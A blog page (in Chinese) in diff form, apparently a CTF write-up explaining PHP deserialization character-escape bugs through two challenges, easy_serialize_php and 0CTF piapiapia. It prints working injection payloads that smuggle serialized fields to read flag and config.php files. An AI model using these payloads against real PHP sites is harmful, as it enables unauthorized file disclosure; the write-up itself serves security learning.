@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="php反序列化字符逃逸漏洞成因序列化字符串在经过过滤函数不正确的处理而导致对象注入，主要原因是过滤函数放在了serialize函数之后。 缩短逃逸参考文章： BUUCTF之[安洵杯 2019]easy_serialize_php 代码审计&lt;?php$function &#x3D; @$_GET[&#x27;f&#x27;];  #从$_GET超全局数组中获取一个名为 f 的键的对应值，使用错误控制运算">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化字符逃逸">
+<meta property="og:url" content="http://example.com/2025/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="php反序列化字符逃逸漏洞成因序列化字符串在经过过滤函数不正确的处理而导致对象注入，主要原因是过滤函数放在了serialize函数之后。 缩短逃逸参考文章： BUUCTF之[安洵杯 2019]easy_serialize_php 代码审计&lt;?php$function &#x3D; @$_GET[&#x27;f&#x27;];  #从$_GET超全局数组中获取一个名为 f 的键的对应值，使用错误控制运算">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204888.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204435.png">
+<meta property="article:published_time" content="2025-02-05T18:03:28.000Z">
+<meta property="article:modified_time" content="2025-02-05T18:05:12.229Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="php反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204888.png">
+
+<link rel="canonical" href="http://example.com/2025/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>php反序列化字符逃逸 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_1.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php反序列化字符逃逸
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-06 02:03:28 / 修改时间：02:05:12" itemprop="dateCreated datePublished" datetime="2025-02-06T02:03:28+08:00">2025-02-06</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a><code>php</code>反序列化字符逃逸</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>序列化字符串在经过过滤函数不正确的处理而导致对象注入，主要原因是<strong>过滤函数放在了<code>serialize</code>函数之后</strong>。</p>
+<h2 id="缩短逃逸"><a href="#缩短逃逸" class="headerlink" title="缩短逃逸"></a>缩短逃逸</h2><p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/119185112">BUUCTF之[安洵杯 2019]easy_serialize_php</a></p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];  <span class="comment">#从$_GET超全局数组中获取一个名为 f 的键的对应值，使用错误控制运算符 @ 来抑制可能发生的任何错误。GET传参f的值</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);   <span class="comment">#数组的键成为新变量的名称，而数组的值成为这些变量的值。</span></span><br><span class="line"><span class="comment">#_SESSION[phpflag] = ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;   </span><br><span class="line"><span class="comment">#$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">    <span class="comment">#将匹配的部分替换为空字符串(删除，这里好像可以双写绕过不确定)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a><code>extract()</code>函数</h4><p><code>extract()</code>函数用于将数组中的键值对转换为变量。使用<code>extract()</code>函数时，数组的键成为新变量的名称，而数组的值成为这些变量的值。</p>
+<p>根据<code>extract()</code>我们可以进行变量覆盖，当我们传入<code>SESSION[flag]=123</code>时，<code>SESSION[&quot;user&quot;]</code>和<code>SESSION[&#39;function&#39;]</code>全部会消失,只剩下<code>SESSION[flag]=123</code>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;jt&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$arr</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#输出：jt</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// extract($_POST);</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>] = <span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="comment">// echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize_info</span>;</span><br><span class="line"><span class="comment">#a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;</span></span><br><span class="line"><span class="comment">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">#a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>构造的序列化串为<code>;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>] = <span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>由于是由<code>extract($_POST)</code>重新设置的变量，最终<code>payload</code>为<br><code>_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204888.png" alt="image-20241118231728369" style="zoom:50%;" />
+
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204435.png" alt="image-20241118231700590" style="zoom:50%;" />
+
+<p><code>/d0g3_fllllllag</code>里应该就是<code>flag</code>了，将<code>payload</code>中的<code>ZDBnM19mMWFnLnBocA==</code>替换成<code>L2QwZzNfZmxsbGxsbGFn</code>即可。</p>
+<h2 id="增长逃逸"><a href="#增长逃逸" class="headerlink" title="增长逃逸"></a>增长逃逸</h2><p>通过下面这个例子学习一下：</p>
+<p>不能对<code>$pass</code>进行改动，要求输出<code>hack</code>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:4:&quot;hack&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//     public $name = &#x27;aaa&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;&#x3D;[0CTF 2016]piapiapia&#x3D;&#x3D;</p>
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line">    &#125;</span><br><span class="line">------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#------------------------profile.php----------------------------</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">        <span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">        <span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>​	序列化后，紧接着就是对序列化字符串进行过滤，想到反序列化字符逃逸漏洞，<code>where-&gt;hacker</code>本题是增长逃逸。</p>
+<p>​	利用数组绕过<code>preg_match</code>对<code>nickname</code>的检查，传入<code>nickname[]</code>即可。</p>
+<p>因为前面是<strong>数组</strong>，所以闭合方式由<code>&quot;;</code>变成了**<code>&quot;;&#125;</code>**，因此也要多加一个<code>where</code>，最后的<code>payload</code>如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span><br><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span><br><span class="line">&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="注："><a href="#注：" class="headerlink" title="注："></a><strong>注</strong>：</h3><p>​	拿到了后门文件后发现<code>www</code>目录下有许多<code>.php</code>文件，但是依然没有任何思路，傻傻的分析这些代码还以为是<code>sql</code>注入🙃。看<code>wp</code>才知道要访问一下这些文件的路由，其实分析代码的时候也能看出来这些<code>.php</code>文件都是可以访问的。</p>
+<p>​	这道题思路<code>payload</code>都没问题后，还是一直打不通，换了两个<code>bp</code>三个浏览器，<code>Hackbar</code>也尝试过，都失败了😭。解决过程：<br>经过不同的测试后发现可能是<code>bp</code>里虽然修改了，但是提交的数据还是原来的内容，我还一直以为是我<code>bp</code>的问题。最后发现其实是将数据包发送到<code>Repeater</code>后的修改无效😅，真离谱。所以抓包后要先修改内容，再把数据包发送到<code>Repeater</code>，这样的修改才是有效的。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># php反序列化</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/02/06/web%E5%AE%89%E5%85%A8-phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="PHPSession反序列化">
+      <i class="fa fa-chevron-left"></i> PHPSession反序列化
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="nav-number">1.</span> <span class="nav-text">php反序列化字符逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%A9%E7%9F%AD%E9%80%83%E9%80%B8"><span class="nav-number">1.2.</span> <span class="nav-text">缩短逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.2.1.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#extract-%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.1.1.</span> <span 